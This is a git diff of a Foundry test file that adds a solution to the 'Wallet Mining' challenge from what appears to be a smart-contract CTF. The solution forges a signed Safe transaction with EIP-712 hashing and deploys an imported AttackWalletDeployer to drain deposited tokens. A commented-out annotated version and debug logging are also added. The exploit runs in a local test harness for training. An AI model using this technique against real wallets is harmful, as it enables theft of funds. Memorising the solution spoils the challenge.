@@ -24,6 +24,8 @@ import {
     SAFE_SINGLETON_FACTORY_ADDRESS,
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
+import {console2} from "forge-std/console2.sol";
+import {AttackWalletDeployer} from "../../src/wallet-mining/solution/AttackWalletDeployer.sol";
 
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -91,6 +93,10 @@ contract WalletMiningChallenge is Test {
         );
         authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));
 
+        console2.log("authorizer", address(authorizer));
+        console2.log("init", authorizer.needsInit());
+        console2.log("upgrader", TransparentProxy(payable(address(authorizer))).upgrader());
+
         // Send big bag full of DVT tokens to the deposit address
         token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);
 
@@ -153,12 +159,123 @@ contract WalletMiningChallenge is Test {
         assertEq(token.balanceOf(player), 0);
     }
 
+    function test_walletMining() public checkSolvedByPlayer {
+        // Store intermediate hashes in memory to reduce stack usage
+        bytes32[] memory hashes = new bytes32[](3);
+
+        // Hash 1: Domain separator
+        hashes[0] = keccak256(
+            abi.encode(
+                0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, block.chainid, USER_DEPOSIT_ADDRESS
+            )
+        );
+
+        // Hash 2: Transaction hash
+        hashes[1] = keccak256(
+            abi.encode(
+                0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8,
+                address(token), // to
+                0, // value
+                keccak256(abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT))), // data hash
+                0,
+                50000,
+                0,
+                0,
+                address(0),
+                address(0),
+                0 // other params
+            )
+        );
+
+        // Hash 3: Final message hash
+        hashes[2] = keccak256(
+            abi.encodePacked(
+                bytes1(0x19),
+                bytes1(0x01),
+                hashes[0], // domain separator
+                hashes[1] // tx hash
+            )
+        );
+
+        // Sign the final hash
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, hashes[2]);
+
+        new AttackWalletDeployer(address(authorizer), walletDeployer, user, ward, abi.encodePacked(r, s, v));
+    }
+
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_walletMining() public checkSolvedByPlayer {
-        
-    }
+    // function test_walletMining_explicit() public checkSolvedByPlayer {
+    //     // IMPLEMENT SIGNATURE
+
+    //     // STEP 1: Define the transaction we want the Safe to execute
+    //     // We want: Safe calls token.transfer(player, 20M tokens)
+    //     address recipient = player;
+    //     uint256 amount = DEPOSIT_TOKEN_AMOUNT;
+    //     bytes memory transferData = abi.encodeCall(token.transfer, (recipient, amount));
+
+    //     // STEP 2: Build Safe transaction parameters
+    //     address to = address(token); // Target contract (DVT token)
+    //     uint256 value = 0; // No ETH being sent
+    //     bytes memory data = transferData; // The transfer call
+    //     uint8 operation = 0; // 0 = Call, 1 = DelegateCall
+    //     uint256 safeTxGas = 50000; // Gas limit for the transaction
+    //     uint256 baseGas = 0; // Base gas cost
+    //     uint256 gasPrice = 0; // Gas price
+    //     address gasToken = address(0); // No gas token (0 = ETH)
+    //     address payable refundReceiver = payable(address(0)); // No refund receiver
+    //     uint256 nonce = 0; // Safe nonce
+
+    //     // STEP 3: Build the Safe Domain Separator
+    //     // This is specific to each Safe instance and chain
+
+    //     bytes32 DOMAIN_SEPARATOR = keccak256(
+    //         abi.encode(
+    //             0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // Safe domain type hash
+    //             block.chainid, // Current chain ID
+    //             USER_DEPOSIT_ADDRESS // Safe contract address
+    //         )
+    //     );
+
+    //     // STEP 4: Build the transaction hash
+    //     // This represents the specific transaction being signed
+
+    //     bytes32 safeTxHash = keccak256(
+    //         abi.encode(
+    //             0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // Safe tx type hash
+    //             to, // Target contract
+    //             value, // ETH value
+    //             keccak256(data), // Hash of call data
+    //             operation, // Operation type
+    //             safeTxGas, // Gas limit
+    //             baseGas, // Base gas
+    //             gasPrice, // Gas price
+    //             gasToken, // Gas token
+    //             refundReceiver, // Refund receiver
+    //             nonce // Transaction nonce
+    //         )
+    //     );
+
+    //     // STEP 5: Create the final message hash (EIP-712 format)
+    //     // This is what actually gets signed
+
+    //     bytes memory messageHash = abi.encodePacked(
+    //         bytes1(0x19), // EIP-191 prefix
+    //         bytes1(0x01), // EIP-712 version
+    //         DOMAIN_SEPARATOR, // Domain separator
+    //         safeTxHash // Transaction hash
+    //     );
+
+    //     // STEP 6: Sign the message hash with user's private key
+    //     bytes32 digest = keccak256(messageHash);
+    //     (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, digest);
+
+    //     // STEP 7: Format signature for Safe (r,s,v format)
+    //     bytes memory signatures = abi.encodePacked(r, s, v);
+
+    //     new AttackWalletDeployer(address(authorizer), walletDeployer, user, ward, signatures);
+    // }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
